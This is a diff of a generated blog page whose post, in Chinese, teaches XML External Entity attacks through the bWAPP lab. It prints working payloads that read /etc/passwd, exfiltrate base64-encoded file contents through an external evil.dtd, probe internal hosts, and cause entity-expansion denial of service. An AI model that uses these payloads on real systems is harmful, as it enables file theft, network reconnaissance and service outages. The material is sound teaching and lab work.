@@ -98,17 +98,25 @@
 
 
 
-  <meta name="description" content="1. XML基础1.1 XML结构XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。 1234567891011121314151617&amp;lt;!--XML申明--&amp;gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; ?&amp;gt; &amp;lt;!--文档类型定义--&amp;gt;&amp;lt;!DOCTYPE note [  &amp;lt;">
+  <meta name="description" content="XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="&#39;XXE&#39;">
 <meta property="og:url" content="https://chirec.github.io/2019/05/09/XXE/index.html">
 <meta property="og:site_name" content="Emerald Dream">
-<meta property="og:description" content="1. XML基础1.1 XML结构XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。 1234567891011121314151617&amp;lt;!--XML申明--&amp;gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; ?&amp;gt; &amp;lt;!--文档类型定义--&amp;gt;&amp;lt;!DOCTYPE note [  &amp;lt;">
+<meta property="og:description" content="XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-05-11T03:09:46.576Z">
+<meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.01.01.XXE_Detect.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.01.02.XXE_Result.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.01.01.XXE_OOB_POST.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.01.02.XXE_OOB_Result.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.01.03.XXE_OOB_accesslog.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.01.03.XXE_OOB_data.png">
+<meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.02.01.internal_network_detect.png">
+<meta property="og:updated_time" content="2019-05-11T03:20:05.650Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;XXE&#39;">
-<meta name="twitter:description" content="1. XML基础1.1 XML结构XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。 1234567891011121314151617&amp;lt;!--XML申明--&amp;gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; ?&amp;gt; &amp;lt;!--文档类型定义--&amp;gt;&amp;lt;!DOCTYPE note [  &amp;lt;">
+<meta name="twitter:description" content="XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。">
+<meta name="twitter:image" content="https://chirec.github.io/2019/05/09/XXE/02.01.01.XXE_Detect.png">
 
 
 
@@ -379,7 +387,11 @@
       
 
       
-        <h1 id="1-XML基础"><a href="#1-XML基础" class="headerlink" title="1. XML基础"></a>1. XML基础</h1><h2 id="1-1-XML结构"><a href="#1-1-XML结构" class="headerlink" title="1.1 XML结构"></a>1.1 XML结构</h2><p>XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。</p>
+        <blockquote>
+<p>XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="1-XML基础"><a href="#1-XML基础" class="headerlink" title="1. XML基础"></a>1. XML基础</h1><h2 id="1-1-XML结构"><a href="#1-1-XML结构" class="headerlink" title="1.1 XML结构"></a>1.1 XML结构</h2><p>XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML申明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt; </span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Windy&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Andy&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Greeting&lt;/head&gt;</span><br><span class="line">&lt;body&gt;Long time no see!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="1-2-DTD"><a href="#1-2-DTD" class="headerlink" title="1.2 DTD"></a>1.2 DTD</h2><h3 id="1-2-1-DTD文档形式"><a href="#1-2-1-DTD文档形式" class="headerlink" title="1.2.1 DTD文档形式"></a>1.2.1 DTD文档形式</h3><h4 id="1-2-1-1-内部DTD文档"><a href="#1-2-1-1-内部DTD文档" class="headerlink" title="1.2.1.1 内部DTD文档"></a>1.2.1.1 内部DTD文档</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span><br></pre></td></tr></table></figure>
 <h4 id="1-2-1-2-外部DTD文档"><a href="#1-2-1-2-外部DTD文档" class="headerlink" title="1.2.1.2 外部DTD文档"></a>1.2.1.2 外部DTD文档</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>
@@ -392,10 +404,10 @@
 <p>普通实体使用<code>&amp;实体名;</code>来进行引用；<br>参数实体只能在定义种出现。</p>
 <h1 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h1><h2 id="2-1-读取任意文件"><a href="#2-1-读取任意文件" class="headerlink" title="2.1 读取任意文件"></a>2.1 读取任意文件</h2><h3 id="2-1-1-探测XXE漏洞"><a href="#2-1-1-探测XXE漏洞" class="headerlink" title="2.1.1 探测XXE漏洞"></a>2.1.1 探测XXE漏洞</h3><p>以bWAPP的XXE漏洞为例</p>
 <p>抓包发现，返回数据格式是xml格式</p>
-<p>&lt;%asset_img XXE/02.01.01.XXE_Detect.png%&gt;</p>
+<img src="/2019/05/09/XXE/02.01.01.XXE_Detect.png">
 <p>Payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;data;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
-<p>&lt;%asset_img XXE/02.01.02.XXE_Result.png%&gt;</p>
+<img src="/2019/05/09/XXE/02.01.02.XXE_Result.png">
 <h2 id="2-2-URL请求"><a href="#2-2-URL请求" class="headerlink" title="2.2 URL请求"></a>2.2 URL请求</h2><h3 id="2-2-1-Blind-XXE"><a href="#2-2-1-Blind-XXE" class="headerlink" title="2.2.1 Blind XXE"></a>2.2.1 Blind XXE</h3><p>在某些情况下，即使存在XXE漏洞，服务器并不会将数据回显。这种情况下，使用外带数据(Out Of Band, OOB)依然可以获得数据。</p>
 <p>test.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$xml = $_POST[<span class="string">'xml'</span>];</span><br><span class="line">	$data = @simplexml_load_string($xml);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	@print_r($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -407,11 +419,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello!</span><br></pre></td></tr></table></figure>
 <p>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xml=&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">	&lt;!DOCTYPE ANY[</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://localhost:8000/Blind_XXE/evil.dtd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=d:/test.txt&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%send;</span><br><span class="line">	]&gt;</span><br></pre></td></tr></table></figure>
-<p>访问test.php，将payload用post方式传入。<br>&lt;%asset_img XXE/02.02.01.01.XXE_OOB_POST.png%&gt;调用外部DTD文档<code>evil.dtd</code>，访问<code>XXE_OOB.php</code>，将数据写入<code>xxe.txt</code>文档中。<br>&lt;%asset_img XXE/02.02.01.02.XXE_OOB_Result.png%&gt;<br>也可以查看<code>access.log</code>获取数据。<br>&lt;%asset_img XXE/02.02.01.03.XXE_OOB_accesslog.png%&gt;</p>
+<p>访问test.php，将payload用post方式传入。<br><img src="/2019/05/09/XXE/02.02.01.01.XXE_OOB_POST.png">调用外部DTD文档<code>evil.dtd</code>，访问<code>XXE_OOB.php</code>，将数据写入<code>xxe.txt</code>文档中。<br><img src="/2019/05/09/XXE/02.02.01.02.XXE_OOB_Result.png"><br>也可以查看<code>access.log</code>获取数据。<br><img src="/2019/05/09/XXE/02.02.01.03.XXE_OOB_accesslog.png"></p>
 <p>数据<code>aGVsbG8h</code>经过Base64编码，解码后为<code>hello!</code></p>
-<p>&lt;%asset_img XXE/02.02.01.03.XXE_OOB_data.png%&gt;</p>
+<img src="/2019/05/09/XXE/02.02.01.03.XXE_OOB_data.png">
 <h3 id="2-2-2-内网探测"><a href="#2-2-2-内网探测" class="headerlink" title="2.2.2 内网探测"></a>2.2.2 内网探测</h3><h4 id="2-2-2-1-端口扫描"><a href="#2-2-2-1-端口扫描" class="headerlink" title="2.2.2.1 端口扫描"></a>2.2.2.1 端口扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ipconfig [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.126.1&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
-<p>&lt;%asset_img XXE/02.02.02.01.internal_network_detect.png%&gt;</p>
+<img src="/2019/05/09/XXE/02.02.02.01.internal_network_detect.png">
 <h2 id="2-3-DOS拒绝服务"><a href="#2-3-DOS拒绝服务" class="headerlink" title="2.3 DOS拒绝服务"></a>2.3 DOS拒绝服务</h2><p>递归调用，占用大量服务器资源</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE DOS [</span><br><span class="line">&lt;!ENTITY DOS0 &quot;DOS&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS1 &quot;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS2 &quot;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS3 &quot;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS4 &quot;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS5 &quot;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS6 &quot;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS7 &quot;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS8 &quot;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS9 &quot;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;DOS&gt;&amp;DOS9;&lt;/DOS&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="2-4-远程代码执行"><a href="#2-4-远程代码执行" class="headerlink" title="2.4 远程代码执行"></a>2.4 远程代码执行</h2><p>当目标服务器安装了PHP expect模块，并且加载了该模块时，可以使用<code>expect</code>执行系统命令。</p>
